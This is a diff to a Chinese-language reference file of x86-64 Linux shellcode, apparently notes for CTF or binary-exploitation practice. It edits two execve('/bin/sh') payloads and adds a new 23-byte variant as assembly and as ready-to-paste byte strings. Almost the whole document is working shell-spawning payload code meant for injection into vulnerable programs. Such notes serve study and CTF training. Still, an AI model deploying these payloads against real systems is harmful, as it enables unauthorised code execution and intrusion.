@@ -66,7 +66,7 @@ mov rbx,0x68732f6e69622f
 push rbx
 push rsp
 pop rdi
-mov al, 59
+mov al, 0x3b
 syscall
 # shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
 ```
@@ -81,9 +81,27 @@ mov rbx,0x68732f2f6e69622f
 push rbx
 push rsp
 pop rdi
-mov al, 59
+mov al, 0x3b
 syscall
 # shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
+```
+
+23 byte的另一种写法：
+
+```assembly
+xor    esi, esi
+movabs rbx, 0x68732f2f6e69622f
+push   rsi
+push   rbx
+push   rsp
+pop    rdi
+push   0x3b
+pop    rax
+xor    edx, edx
+syscall
+
+# shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
+# shellcode = b'1\xf6H\xbb/bin//shVST_j;X1\xd2\x0f\x05'
 ```
 
 ### 标准shellcode 31 byte
@@ -138,4 +156,6 @@ syscall
 ```
 
 
+
+### 
 
